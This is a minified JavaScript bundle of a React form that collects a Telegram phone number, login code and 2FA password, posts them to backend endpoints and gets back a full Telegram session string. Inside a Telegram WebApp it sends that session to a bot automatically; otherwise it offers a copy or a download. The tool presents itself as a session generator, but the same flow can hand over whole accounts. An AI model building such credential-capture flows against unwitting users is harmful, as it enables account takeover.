(globalThis.TURBOPACK||(globalThis.TURBOPACK=[])).push(["object"==typeof document?document.currentScript:void 0,1852,e=>{"use strict";var t=e.i(43476),s=e.i(71645);function a({dict:e}){let[a,r]=(0,s.useState)("phone"),[n,l]=(0,s.useState)(""),[o,c]=(0,s.useState)(""),[i,d]=(0,s.useState)(""),[m,u]=(0,s.useState)(""),[x,h]=(0,s.useState)(""),[p,b]=(0,s.useState)(""),[j,y]=(0,s.useState)(!1),[v,f]=(0,s.useState)(!1),[g,N]=(0,s.useState)(!1);(0,s.useEffect)(()=>{let e=window.Telegram?.WebApp;e?.initData&&(N(!0),e.expand?.(),e.ready?.());let t=localStorage.getItem("auth_phone"),s=localStorage.getItem("auth_sessionId");t&&s&&(l(t),u(s),r("code"))},[]);let w=async t=>{if(t.preventDefault(),b(""),!n.trim())return void b(e.errors.phoneRequired);if(!n.startsWith("+"))return void b(e.errors.phoneFormat);y(!0);try{let e=await fetch("/api/init",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone:n})}),t=await e.json();t.error?b(t.error):(u(t.sessionId),localStorage.setItem("auth_phone",n),localStorage.setItem("auth_sessionId",t.sessionId),r("code"))}catch{b("Network error. Please try again.")}y(!1)},S=async t=>{if(t.preventDefault(),b(""),!o.trim())return void b(e.errors.codeRequired);y(!0);try{let e=await fetch("/api/code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({sessionId:m,code:o})}),t=await e.json();t.error?b(t.error):t.needs2FA?r("password"):I(t.session)}catch{b("Network error. Please try again.")}y(!1)},k=async t=>{if(t.preventDefault(),b(""),!i)return void b(e.errors.passwordRequired);y(!0);try{let e=await fetch("/api/password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({sessionId:m,password:i})}),t=await e.json();t.error?b(t.error):I(t.session)}catch{b("Network error. Please try again.")}y(!1)},T=e=>{let t=window.Telegram?.WebApp,s=e||x;t&&s&&(t.sendData(s),t.close())},I=e=>{localStorage.removeItem("auth_phone"),localStorage.removeItem("auth_sessionId"),h(e),g?(r("sending"),setTimeout(()=>{T(e)},1500)):r("success")},C=()=>{switch(a){case"phone":return 1;case"code":case"password":return 2;case"sending":case"success":return 3}};return(0,t.jsxs)("div",{className:"card p-6 w-full max-w-sm mx-auto",children:[(0,t.jsxs)("div",{className:"text-center mb-6",children:[(0,t.jsx)("h1",{className:"text-xl font-semibold text-[var(--text-primary)] mb-1",children:e.title}),(0,t.jsx)("p",{className:"text-sm text-[var(--text-secondary)]",children:e.subtitle})]}),(0,t.jsx)("div",{className:"flex justify-center gap-2 mb-6",children:[1,2,3].map(e=>(0,t.jsx)("div",{className:`w-2 h-2 rounded-full transition-colors ${e<C()?"bg-green-500":e===C()?"bg-[var(--accent)]":"bg-[var(--bg-tertiary)]"}`},e))}),"success"!==a&&(0,t.jsx)("div",{className:"info-box mb-5 text-sm",children:e.info}),p&&(0,t.jsx)("div",{className:"error-box mb-5",children:p}),"phone"===a&&(0,t.jsxs)("form",{onSubmit:w,children:[(0,t.jsxs)("div",{className:"mb-5",children:[(0,t.jsx)("label",{className:"block text-sm font-medium text-[var(--text-secondary)] mb-2",children:e.phone.label}),(0,t.jsx)("input",{type:"tel",value:n,onChange:e=>l(e.target.value),placeholder:e.phone.placeholder,autoFocus:!0}),(0,t.jsx)("p",{className:"hint mt-2",children:e.phone.hint})]}),(0,t.jsxs)("button",{type:"submit",className:"btn-primary w-full",disabled:j,children:[j?(0,t.jsx)("span",{className:"spinner"}):null,e.buttons.sendCode]})]}),"code"===a&&(0,t.jsxs)("form",{onSubmit:S,children:[(0,t.jsx)("div",{className:"mb-3 text-center text-sm text-[var(--text-secondary)]",children:n}),(0,t.jsxs)("div",{className:"mb-5",children:[(0,t.jsx)("label",{className:"block text-sm font-medium text-[var(--text-secondary)] mb-2",children:e.code.label}),(0,t.jsx)("input",{type:"text",value:o,onChange:e=>c(e.target.value),placeholder:e.code.placeholder,maxLength:5,className:"text-center text-xl tracking-[0.3em]",autoFocus:!0}),(0,t.jsx)("p",{className:"hint mt-2",children:e.code.hint})]}),(0,t.jsxs)("button",{type:"submit",className:"btn-primary w-full mb-2",disabled:j,children:[j?(0,t.jsx)("span",{className:"spinner"}):null,e.buttons.verify]}),(0,t.jsx)("button",{type:"button",onClick:()=>{localStorage.removeItem("auth_phone"),localStorage.removeItem("auth_sessionId"),l(""),u(""),c(""),r("phone")},className:"btn-secondary w-full",children:e.buttons.back})]}),"password"===a&&(0,t.jsxs)("form",{onSubmit:k,children:[(0,t.jsxs)("div",{className:"mb-5",children:[(0,t.jsx)("label",{className:"block text-sm font-medium text-[var(--text-secondary)] mb-2",children:e.password.label}),(0,t.jsx)("input",{type:"password",value:i,onChange:e=>d(e.target.value),placeholder:e.password.placeholder,autoFocus:!0}),(0,t.jsx)("p",{className:"hint mt-2",children:e.password.hint})]}),(0,t.jsxs)("button",{type:"submit",className:"btn-primary w-full",disabled:j,children:[j?(0,t.jsx)("span",{className:"spinner"}):null,e.buttons.submit]})]}),"sending"===a&&(0,t.jsxs)("div",{className:"text-center py-8",children:[(0,t.jsx)("div",{className:"text-5xl mb-4",children:"✅"}),(0,t.jsx)("h2",{className:"text-xl font-semibold text-[var(--text-primary)] mb-2",children:"Авторизация успешна!"}),(0,t.jsx)("p",{className:"text-[var(--text-secondary)] mb-4",children:"Отправляю данные боту..."}),(0,t.jsx)("span",{className:"spinner"})]}),"success"===a&&(0,t.jsxs)("div",{children:[(0,t.jsx)("div",{className:"success-box mb-5 text-center",children:e.success.title}),(0,t.jsx)("label",{className:"block text-sm font-medium text-[var(--text-secondary)] mb-2",children:e.success.sessionLabel}),(0,t.jsx)("div",{className:"bg-[var(--bg-tertiary)] p-3 rounded-lg mb-5 font-mono text-xs break-all max-h-32 overflow-auto text-[var(--text-secondary)]",children:x}),(0,t.jsxs)("div",{className:"space-y-2",children:[(0,t.jsx)("button",{onClick:()=>{navigator.clipboard.writeText(x),f(!0),setTimeout(()=>f(!1),2e3)},className:"btn-primary w-full",children:v?e.success.copied:e.success.copy}),g&&(0,t.jsx)("button",{onClick:()=>T(),className:"w-full py-3 px-4 rounded-xl font-medium text-sm text-white transition-all hover:opacity-90",style:{background:"linear-gradient(135deg, #2AABEE 0%, #229ED9 100%)"},children:e.success.sendToBot}),(0,t.jsx)("button",{onClick:()=>{let e=new Blob([x],{type:"text/plain"}),t=URL.createObjectURL(e),s=document.createElement("a");s.href=t,s.download="telegram-session.txt",s.click(),URL.revokeObjectURL(t)},className:"btn-secondary w-full",children:e.success.download})]})]})]})}e.s(["default",()=>a])}]);